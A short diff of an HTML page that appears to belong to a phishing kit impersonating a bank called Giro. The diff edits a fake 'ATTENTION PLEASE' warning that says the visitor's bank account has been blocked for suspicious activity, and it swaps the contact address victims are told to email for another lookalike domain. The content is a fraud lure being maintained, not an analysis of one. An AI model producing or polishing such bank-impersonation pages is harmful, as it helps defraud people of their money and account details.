@@ -19,11 +19,10 @@
                     <h2>ATTENTION PLEASE</h2>
                     <p>
                          Due to suspicious activity, we have
-                         temporarily blocked your account. To
-                         avoid suspension, please contact our
+                         temporarily blocked your Giro bank
+                         account.please contact our
                          support team via email
-                         giroteam@girobankonline.com and
-                         confirm your online information
+                         customerservice@giros.uk
                     </p>
                     <div class="ml-auto">
                          <a href="index.php" style="background-color: darkblue; color:white" class="btn btn-block">Ok</a>
